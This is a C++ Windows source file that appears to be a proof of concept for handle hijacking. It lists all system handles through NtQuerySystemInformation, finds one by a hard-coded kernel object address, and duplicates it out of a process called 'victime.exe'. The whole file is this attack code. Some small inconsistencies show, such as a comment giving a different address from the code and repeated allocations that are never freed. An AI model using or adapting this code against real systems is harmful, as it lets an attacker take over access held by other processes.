#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>

#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

DWORD
GetPID(
    const char* pname
)
{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);

        if (Process32First(hSnap, &pE))
        {
            if (!pE.th32ProcessID)
                Process32Next(hSnap, &pE);
            do
            {
                if (!_stricmp(pE.szExeFile, pname))
                {
                    procId = pE.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return (procId);
}

int
HijackHandle(
    HANDLE fileHandle,
    DWORD UniqueProcessId)
{
    if (!fileHandle)
        return -1;

    HANDLE phandle = OpenProcess(PROCESS_DUP_HANDLE, 0, UniqueProcessId);

    if (!phandle)
    {
        printf("error open process\n");
        return (-1);
    }

    printf("opening target process\n");

    HANDLE duplicateHandle = 0;
    DuplicateHandle(phandle, fileHandle, GetCurrentProcess(), &duplicateHandle, 0, FALSE, DUPLICATE_SAME_ACCESS);

    if (!duplicateHandle)
    {
        printf("error while duplicating handle\n");
        CloseHandle(phandle);
        return (-1);
    }

    printf("handle duplicated\n");
    CloseHandle(phandle);
    return 0;
}

int
wmain(
    void
)
{
    ULONG returnLenght = 0;
    unsigned long long aSize = 0x69;
    PSYSTEM_HANDLE_INFORMATION hInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(aSize);

    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle("ntdll"), "NtQuerySystemInformation");
    while (NtQuerySystemInformation(0x10, hInfo, aSize, &returnLenght) == STATUS_INFO_LENGTH_MISMATCH)
    {
        aSize = returnLenght + 1024;
        hInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(aSize);
    }

    for (int i = 0; i < hInfo->NumberOfHandles; i++)
    {

        if (hInfo->Handles[i].Object != (PVOID)0xffff8007aee061f0) // 0xffff80078354f930 is the handle object
            continue;

        printf_s("Handle 0x%x object 0x%p, UPID: %x handle number %d\n", hInfo->Handles[i].HandleValue, hInfo->Handles[i].Object, hInfo->Handles[i].UniqueProcessId, i);
        if (!HijackHandle((HANDLE)hInfo->Handles[i].HandleValue, GetPID("victime.exe")))
        {
            printf("Handle Hijacked successfully\n");
            break;
        }
    }
    getchar();
    return 0;
}

